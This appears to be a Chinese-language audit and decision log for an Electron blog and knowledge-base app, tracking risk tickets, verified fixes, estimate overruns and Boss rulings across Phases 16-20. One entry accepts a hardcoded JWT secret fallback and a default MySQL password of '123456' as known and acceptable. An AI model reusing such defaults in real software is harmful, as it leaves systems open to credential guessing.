| **修复方案** | ① 将 T2018 拆为"验证"（tsc+build，1h）和"新功能测试"（8-10h）两个独立任务；② 新功能测试优先覆盖: graph data 聚合逻辑 + ref:add/remove 幂等性 + note:createDaily 幂等性 + wikilink 正则预处理 |

**R189 — 三元态回归风险**

| **位置** | 全局 — 所有新组件 |
| **后果** | Phase 19 刚修完 R149+R165+R168（6 页面补 error/retry），Phase 20 新增 6+ 数据获取组件若无同样规划 → 再次出现永久 loading 或静默失败 |
| **修复方案** | 将"loading/empty/error 三元态"作为 Phase 20 代码审查 checklist，每个新增 `useEffect + window.api.xxx()` 的数据组件必须: `const [loading, setLoading] = useState(true); const [error, setError] = useState<string|null>(null);` + UI 渲染三态分支 + `.catch(() => setError(...))` 或 `.finally(() => setLoading(false))` |

**R190 — abortedRef 竞态回归风险**

| **位置** | 全局 — HomePage/ContextPanel/GraphPage |
| **后果** | 快速导航离开 → async .then() 回调中 `setState` on unmounted component → React Strict Mode 警告 + 潜在内存泄漏 |
| **修复方案** | 遵循 R152 确立的标准模式: `const abortedRef = useRef(false); useEffect(() => { ...; return () => { abortedRef.current = true; }; }, []);` + `.then(data => { if (!abortedRef.current) setData(data); })` |

**R191 — Phase 20 整体工时低估**

| **位置** | `todo.md:240-244` |
| **后果** | Boss 批准 58.5h，实际消耗 85-100h → Phase 20 超预算 45-70% → 后续 Phase 被挤压。根源: T2002(5h→10-12h)、T2003(3h→6-8h)、T2004(6h→10-12h)、T2006(5h→10-14h) 四个关键任务各低估 2-3x |
| **修复方案** | ① 调整估算: 58.5h→85h（中层估计）或接受不限工时模式（规格已声明"首个不限工时 Phase"）；② 若需控制时间: 降级 T2016 MCP(8h→延 Phase 21)、T2013 迷你图谱合并到 T2014；③ 已在估算调整后、可将 Phase 总数更新为诚实值 |

**R192 — T2001 设计 token 升级期破坏现有页面**

| **位置** | `todo.md:221` , `src/renderer/index.css` |
| **后果** | T2001 在 Phase 20A 开头删除 `--accent-amber`/`--accent-purple`/`--shadow-card` → 所有现有页面（14 路由）渲染时 CSS 变量失效 → 颜色乱掉、卡片无样式 → 20A 实现期间整个应用视觉损坏 |
| **修复方案** | 分两步: ① T2001 保留旧 token 作为别名（`--accent-amber: var(--text-secondary); --accent-purple: var(--accent-blue);`）— 新旧组件共存期；② T2017（设计打磨）集中删除别名和清理引用。这样 20A-20C 期间应用始终可视 |

**R193 — 侧边栏折叠缺可访问性**

| **位置** | `todo.md:222` |
| **后果** | 侧边栏从 hover 展开（鼠标依赖）改为手动折叠 → 新 toggle 按钮若无 `aria-expanded`/`aria-label`/键盘快捷键 → 键盘用户无法折叠侧边栏（鼠标依赖 → 按钮依赖 = 换汤不换药） |
| **修复方案** | ① toggle 按钮加 `aria-expanded={isOpen}` + `aria-label="折叠侧边栏"`；② 键盘快捷键 `Ctrl+B` 注册到 ShortcutService（与 VS Code/Obsidian 惯例一致）；③ 折叠后导航图标保留 `aria-label`（不依赖 tooltip） |

---

### 已修复 (P3 存量) ✅

| R165 | ✅ 已修复 — BlogPreviewPage .catch(() => setLoading(false)) 防止永久 loading | ✅ 已验证 — L114 `.catch(() => setLoading(false))` |
| R166 | ✅ 已修复 — ContinueWritingPage 本地类型改为 import shared DraftItem/LastBlog/RecentFile | ✅ 已验证 — L3 `import type { DraftItem, LastBlog, RecentFile }` 替代本地 interface |
| R167 | ✅ 已修复 — cleanOldNotes() 先 SELECT COUNT(*) 再 DELETE，返回实际清理数 | ✅ 已验证 — L106-108 `SELECT COUNT(*)` + `return before?.c ?? 0` |
| R168 | ✅ 已修复 — BlogListPage/KnowledgeListPage/DashboardPage 全加 error state + retry 按钮 | ✅ 已验证 — BlogListPage L131/170/440-443, KnowledgeListPage L113/146/410-413, DashboardPage L34/50-83/208-211 |
| R169 | ✅ 已修复 — TagManagePage `:any` map 回调改为 BlogWithTags/KnowledgeFileWithTags | ✅ 已验证 — L217 `b: BlogWithTags`, L218 `f: KnowledgeFileWithTags` |

### 全量审计修复 ✅ (R144-R157)

| # | ✅ 已修复 | **验证** |
|---|---------|---------|
| R144 | ✅ db/index.ts migrateSqlJsToMySQL() 补 notes/refs/folders 3 表 try-catch | ✅ 已验证 |
| R145 | ✅ KB_GET/KB_PREVIEW/KB_OPEN_EXTERNAL +userId, getFile/genPreview + buildKnowledgeSelectByUser | ✅ 已验证 |
| R146 | ✅ rowToReference() snake→camelCase 映射 + DraftRow saved_at→savedAt 别名 | ✅ 已验证 |
| R147 | ✅ validateFilename() path.basename 防 ../ 穿越 | ✅ 已验证 |
| R148 | ✅ upload.ts 改用 buildKnowledgeCreate() 自动含时间戳 | ✅ 已验证 |
| R149 | ✅ NoteListPage/CalendarView/SeriesListPage error 状态 + retry 按钮 | ✅ 已验证 |
| R150 | ✅ KB_PREVIEW 返回 {success: false, error} 修复 IPC 契约 | ✅ 已验证 |
| R151 | ✅ 新建 shared/handlers/folder-crud.ts 共享 handlers | ✅ 已验证 |
| R152 | ✅ NoteListPage/CalendarView/TimelineView abortedRef 防卸载后 setState | ✅ 已验证 |
| R153 | ✅ ipc-channels.ts IPC.PET_* 6 常量, pet.ts + pet-preload.ts 改用常量 | ✅ 已验证 |
| R154 | ✅ R146 根因修复后 `: any` 自动从 9 回落 | ✅ 已验证 |
| R155 | ✅ CalendarView/NoteListPage/FloatingBlogTabs 加 aria-label | ✅ 已验证 |
| R156 | ✅ worker.onmessageerror handler | ✅ 已验证 |
| R157 | ✅ 3 张 SVG img onError display:none 回退 | ✅ 已验证 |

### 🔵 P4 / 已知可接受

- R201: recycle.service.ts `days` 内联 SQL (已文档化)
- R218: shortcut.service.ts `writeFileSync` (已有 best-effort 注释)
- JWT secret 硬编码 fallback / MySQL 密码默认 123456 — 本地单用户应用，D13 已知可接受
- Electron sandbox 正确; CORS/CSRF/Rate Limiting 已知可接受状态

### Phase 19 已修复 ✅

| # | 问题 | 任务 | 验证 |
|---|------|------|------|
| R142 | notes sql.js 迁移缺 ALTER TABLE | T1906 | ✅ db/index.ts:120-124 4 条迁移 |
| R143 | 组件 useState→useReducer | T1909 | ✅ 3 组件共 50 useState→3 useReducer |
| R136 | use-search 超时未清理 | T1901 | ✅ safetyTimeoutRef |
| R137 | ContinueWritingPage unmount 守卫 | T1913 | ✅ abortedRef |
| R138 | blog_drafts 缺 saved_at | T1913 | ✅ buildBlogDraftInsert |
| R139 | mapFile 重复 | T1913 | ✅ mapKnowledgeRow |
| R140 | HTML 未剥离 | T1901 | ✅ stripHtml() |
| R141 | use-search tsc 类型错误 | T1901 | ✅ uid narrowing |
| R77 | Server 缺文本提取 | T1913 | ✅ mammoth/exceljs |
| R115 | Server 冗余 userId 守卫 | T1913 | ✅ 30+ 处移除 |
| R202 | knowledge filePath 验证 | T1913 | ✅ 校验已加 |
| R208 | WindowApi 6 处类型化 | T1912 | ✅ 全部具体类型 |
| R214 | preview 解析超时 | T1913 | ✅ 30s timeout |
| R216 | ShortcutSettings 泄漏 | T1913 | ✅ entry cleanup |
| R219 | db/index try-catch | T1913 | ✅ 已加 |

### Phase 18 已修复 ✅

| # | 问题 | Phase 18 任务 | 验证 |
|---|------|--------------|------|
| R112 | CRUD 双写 | **T1802** | ✅ shared handlers: blog-crud.ts (17) + knowledge-crud.ts (13) |
| R117 | Service 测试缺口 | **T1804** | ✅ 4 核心 Service, 49 tests (6 files) |
| R113 | Blog 映射函数 | **T1806** | ✅ rowToBlog/mapBlog/mapBlogRow→mapBlogRow |
| R211 | Dashboard loading | **T1807** | ✅ 分节 loading+error 状态 |
| R212 | ContinueWriting loading | **T1807** | ✅ 三区域 loading+error + catch 修复 |
| R213 | 编辑器闪烁 | **T1805** | ✅ loading 状态骨架屏 |
| R119 | ContinueWriting 空 catch | **T1807** | ✅ console.error + setError |

### Phase 19 已修复 ✅

| # | 问题 | Phase 19 任务 | 验证 |
|---|------|--------------|------|
| R137 | ContinueWritingPage unmount 守卫 | **T1913** | ✅ abortedRef + .then/.catch/.finally 守卫 |
| R138 | blog_drafts INSERT 缺 saved_at | **T1913** | ✅ buildBlogDraftInsert 替代内联 SQL |
| R139 | mapFile 重复 + 未类型化 | **T1913** | ✅ mapKnowledgeRow + mapFileWithTags |
| R77 | Server knowledge text extraction | **T1913** | ✅ mammoth/exceljs server-side |
| R115 | Server routes 冗余 userId guard | **T1913** | ✅ 全部替换为 `req.userId!` |
| R214 | preview.service.ts 解析超时 | **T1913** | ✅ Promise.race 30s |
| R216 | ShortcutSettings 监听器泄漏 | **T1913** | ✅ handleRecord 入口 cleanup |
| R218 | shortcut.service.ts try-catch | **T1913** | ✅ 已确认存在 |
| R219 | db/index.ts try-catch | **T1913** | ✅ sqlJsSave + sqlJsSaveNow |
| R202 | knowledge import filePath 验证 | **T1913** | ✅ 类型/空值/空字节校验 |
| R117 | Service 全覆盖测试 | **T1914** | ✅ 5 新文件: folder/recycle/stats/preview/reference (79 tests, 11 files) |

### 🔵 P4 / 已知可接受

- Electron sandbox 正确 (`sandbox:true`/`contextIsolation:true`/`nodeIntegration:false`)
- CORS/CSRF/Rate Limiting 为已知可接受状态
- Server routes `as any[]` 29 处 (MySQL 驱动豁免，D13 确认)

---

## 3. 当前决策点

### Phase 20 立案前审查 (2026-05-18) — Boss 已裁决 ✅

| 编号 | 决策点 | Auditor 建议 | Boss 裁决 |
|------|--------|-------------|-----------|
| **D54** | refs CHECK 约束与 `'note'` 冲突 | **A — 移除 CHECK，改应用层校验** | ✅ **A** — 应用层单入口校验等价防护，零迁移成本。SQLite 无 DROP CHECK，表重建是过度工程 |
| **D55** | MCP Server 进程模型 | **A — 拆分入口**。stdio 独立 CLI + HTTP Express 路由 | ✅ **A** — 同时解决 R172(进程冲突)和 R175(CSRF)。stdio 是独立进程,HTTP 走 3456 同端口同 JWT |
| **D56** | MCP HTTP CSRF 防护 | **由 D55 自然解决** | ✅ **同意** — R175 已被 D55 消除。无独立端口 = 无新增攻击面 |
| **D57** | T2005 "自动创建"时机 | **A — HomePage 挂载时检查** | ✅ **A** — 最简单方案。用户在首页才需要今日便签，零后台消耗。午夜定时器过度设计 |
| **D58** | [[wikilink]] 引用删除机制 | **A — blog:update 时扫描+diff** | ✅ **A** — 一次 SQL 解决创建+删除两方向。单事务原子操作、幂等、可修复。ProseMirror 无节点删除事件是事实，不值得绕 |
| **D59** | T2011 主题迁移 | **A — 加载时映射迁移** | ✅ **A** — 5 行 JS，零破坏。forest→dark, sakura→light, paper→sepia, midnight→dark |
| **D60** | 托盘菜单 emoji 策略 | **A — 纯文本标签 (无图标)** | ✅ **A** — 不引入 PNG 管线。托盘菜单是系统级右键菜单，纯文本是 macOS/Win 平台惯例 |
| **D61** | DashboardPage/ContinueWritingPage 去留 | **A — 删除源文件** | ✅ **A** — 死代码即技术债。git history 保留历史参考。CalendarView 移入 components/ |
| **D62** | Phase 20 工时调整 | **A — 接受不限工时模式 + 诚实更新估算** | ✅ **A** — 不限工时已声明。估算更新为 ~85h。迷你图谱可合并到全屏图谱如时间紧张。MCP 不延后——这是战略差异化 |

### Phase 18 规格审查 (2026-05-14) — Boss 已裁决

| 编号 | 决策点 | Auditor 建议 | Boss 裁决 |
|------|--------|-------------|-----------|
| D43 | FULLTEXT INDEX 是否 Schema 变更 | A — INDEX 不算 | ✅ A — T1105 冻结表结构非索引 |
| D44 | Worker 线程位置 | A — Renderer Worker | ✅ A — Intl.Segmenter 浏览器 API |
| D45 | shared handler 覆盖范围 | A — SQL 构建, 副作用各自处理 | ✅ A — 6h 限定 |

**全部裁决关闭** ✅

---

## 4. 重构建议 (非紧急)

1. **CRUD 双写收敛** (R112) — Blog/Knowledge 共享 SQL handler 模式。~8h。Phase 18
2. **Service 单元测试** (R117) — 14/16 Service 补测试。需独立 Phase
3. **Server knowledge text extraction** (R77) — 引入 mammoth/exceljs。~2h

---

## 5. 历史摘要

### 修复统计
累计 ~115 项修复 (F01-F115+)、193 个工单 (R01-R193)、62 个决策点 (D01-D62)。
当前 🔴5 🟠5 🟡8 🟢6 (Phase 20 立案前审查 — 已裁决, 待实施)。`noUncheckedIndexedAccess` ✅, `as any` renderer=0, `: any` renderer=0。
D54-D62: 9/9 Boss 已裁决 ✅。Phase 20 启动条件已满足。

### Phase 20 立案前审查 (2026-05-18)
4 Agent 并行规格审查 (Security+Data / Architecture+Constraints / SpecQuality+Feasibility / TypeSafety+Consistency)。发现 24 项问题: P0 5项 (R170 refs CHECK 冲突 + R171 notes CHECK 冲突 + R172 MCP 进程模型 + R173 非原子 ref + R174 DOMPurify 管线) + P1 5项 (R175 MCP CSRF + R176 properties 迁移间隙 + R177 托盘 SVG + R178 IPC 注册链 + R179 自动创建时机) + P2 8项 (R180 图谱类型 + R181 graph userId + R182 mcp:* 误列 + R183 主题迁移 + R184 文件去留 + R185 properties schema + R186 Tab 竞态 + R187 双重重构) + P3 6项 (R188 测试工时 + R189 三元态 + R190 abortedRef + R191 整体工时 + R192 token 破坏 + R193 可访问性)。提出 9 项 Boss 裁决 (D54-D62)。健康度综合 4.7/10 (设计愿景优秀，技术规格需补全)。整体工时估算 58.5h→85-100h (1.5-1.7x 低估)。主要风险: 12 个 P0/P1 规格缺口需在 20A 启动前澄清。

### Phase 19 后全量审计修复 (2026-05-17)
12/12 + :any→0 全部修复验证通过 ✅。构建 51+2+225 ✅。测试 87/87 (12 files) ✅。`: any` renderer=11→0 (全清，含 KnowledgeListPage 2 API 回调 + ReferencePicker 1 TODO)。R158 迁移补列 (blogs +4/tags +1/knowledge_files +2)。R159 note 3 SELECT +user_id。R160 删除 TOCTOU 消窗口。R161 :any 11 处类型化。R162 folder-crud 3 builder 去死代码。R163 webApi 补 4 stub。R164 CalendarView noteList 全链路 due_date 过滤。R165 BlogPreviewPage .catch。R166 ContinueWritingPage 共享类型。R167 cleanOldNotes SELECT COUNT。R168 3 页面 error+retry。R169 TagManagePage map 类型化。P0-P3 再次全零。`: any` renderer 首次达成 0。

### Phase 19 后全量审计 (2026-05-17)
4 Agent 并行审计 + 10 场景用例验证 (Security+Data / Type Safety+Redundancy / Maintainability+Robustness / TestCaseVerification)。发现 12 新工单: P0 1项 (R158 迁移缺列数据丢失) + P1 1项 (R159 note SELECT 缺 user_id) + P2 5项 (R160 TOCTOU删除 + R161 :any↑6 + R162 folder-crud弃用 + R163 api-client缺stub + R164 CalendarView无月份过滤) + P3 5项 (R165 BlogPreviewPage无catch + R166 ContinueWriting重复类型 + R167 cleanOldNotes返0 + R168 列表页缺error状态 + R169 TagManagePage :any残留)。健康度综合 7.7/10 (↓0.2)。`: any` renderer=5→11。首次检测到 P0（数据丢失级）。MemoPage.tsx 已删除（合并入 CalendarView+NoteListPage），但 redo.md/todo.md 仍引用。folder-crud.ts 共享 handler 为死代码。CalendarView 无 due_date 范围过滤加载全量数据。

### Phase 19 全量审计 (2026-05-16)
4 Agent 并行审计 (Security+Data / Type Safety / Redundancy+Maintainability / Robustness)。验证 Phase 19 实施 + R142/R143 修复全部通过。发现 14 新工单: P1 2项 (R144 迁移缺表 + R145 跨用户访问) + P2 6项 (R146 命名不匹配 + R147 路径穿越 + R148 缺时间戳 + R149 缺 error 状态 + R150 格式不一致 + R151 SQL 仍双写) + P3 6项 (R152 竞态 + R153 IPC 硬编码 + R154 :any 上升 + R155 缺 aria + R156 onmessageerror + R157 SVG onerror)。健康度综合 7.9/10 (↓0.1)。`noUncheckedIndexedAccess` ✅, `as any` renderer=0, `: any` renderer=5。

### Phase 19 实施审计 (2026-05-16)
19/19 实施完成。构建 50+2+227 ✅。测试 87/87 (12 files, +38) ✅。IPC 99→100 (+folder:move)。发现 2 项: R142 (notes sql.js 迁移) → ✅ 已修复。R143 (组件收敛) → 🔄 BlogListPage ✅ + TagManagePage ✅，KnowledgeListPage 未收敛延 Phase 20。P0+P1+P2 从 4/0/3 降至 0/0/0。17 项 redo 积压全部清偿。

### Phase 19 关键修复 (2026-05-16)
19/19 全部完成。T1901 FTS5 搜索修复 (stripHtml + userId narrowing + safetyTimeoutRef) + T1902 时间线防御 (createdAt null guard + catch log) + T1903 全局快捷键动态注册 (reregisterAll + globalShortcut) + T1904 安装包图片 (extraResources img/) + T1905 批量分页动态化 + T1906 日历/备忘录 (notes +4列 + CalendarView + NoteListPage + /memo) + T1907 最小化标签条 + T1908 指南 3 张 SVG 配图 + T1909 TagManagePage useReducer (12→1) + T1910 folder:move 7-file IPC + T1911 键盘可访问性 + T1912 WindowApi 6 处类型化 + T1913 P3 批修复 (10/10) + T1914 Service 测试 49→87 + T1915-T1919 5 项体验。构建 ✅ 测试 87/87。IPC 99→100。

### Phase 18 实施审计 (2026-05-14)
7/7 实施完成。发现 13 项: P1 2项 (R130 FULLTEXT INDEX 错列 + R131 format 硬编码) → ✅ 已修复。P2 4项 (R132 搜索竞态 + R133 Worker 崩溃 + R134 restore 缺 updated_at + R135 recycle 缺 user_id) → ✅ 已修复。P3 7项 (R136-R141) → 延 Phase 19。Phase 18 真正结项：P0+P1+P2 全部清零。

### Phase 18 关键修复 (2026-05-14)
7/7 + R130-R135 全部完成。T1801 FTS5 Worker 倒排索引 (Intl.Segmenter + TF-IDF + localStorage 缓存 + correlation ID 竞态修复) + MySQL FULLTEXT INDEX + T1802 CRUD 双写收敛 (blog-crud.ts 17 + knowledge-crud.ts 13) + T1803 错误反馈 (uncaughtException→IPC→Toast) + T1804 Service 测试 27→49 (6 files) + T1805 编辑器闪烁修复 + T1806 映射函数统一 (3→1 mapBlogRow) + T1807 Dashboard/ContinueWriting loading+error。IPC 95→99。构建 ✅ 测试 49/49。

### Phase 17 关键修复 (2026-05-14)
9/9 全部完成。T1708 R207 user_id 隔离 (6 Service + 5 IPC + 7 renderer) + T1704 shell:openExternal IPC + 超链接事件委托 + T1702 blog:seriesRename IPC + 内联编辑 + T1703 系列博客 excludeSeries 过滤 + T1705 系列滚动重置 + T1706 requestSingleInstanceLock + T1707 electron-builder NSIS + T1701 WebEditorPage + T1709 :any 14→5。IPC 93→95。构建 ✅ 测试 27/27。

### Phase 16 关键修复 (2026-05-08)
T1601 mode=edit + scrollRatio + R122-R125 类型错误 + R126 BlogListPage cleanup + R127 api-client webApi 补齐 + R128 TOC_SELECTORS 22项 + R129 顶部编辑按钮

### Phase 15 关键修复 (2026-05-08)
T1502 strict `noUncheckedIndexedAccess` 47 errors→0 + R106 IPC 去重 + R107 Web stub 补齐 + R108 非空断言 + R109 any 收敛

### Phase 14 关键修复 (2026-05-07)
T1403 `as any` 32→0 + T1402 状态机 30 useState→useReducer + R102-R105 修复 + R101 HashRouter→data router

### Phase 13 及之前
Phase 9-13: 安全底线 (PBKDF2/Session/XSS)、架构收敛 (WindowApi/DI模式/IPC契约)、体验增强。详见 git log。

### 安全里程碑
- Phase 11: DOMPurify XSS + catch{} 全量修复 + DB 参数化
- Phase 15: `noUncheckedIndexedAccess` 永久启用
- Phase 16: Server user_id 隔离 4 P1 全部修复 (R203-R206/R209)
- Phase 16: IPC 事件硬编码全量替换 (R210, 6 处)
- Phase 16: 11/11 P1-P4 首轮修复验证通过 (R203-R206/R209/R210/R215/R217/R218/R220/R221)
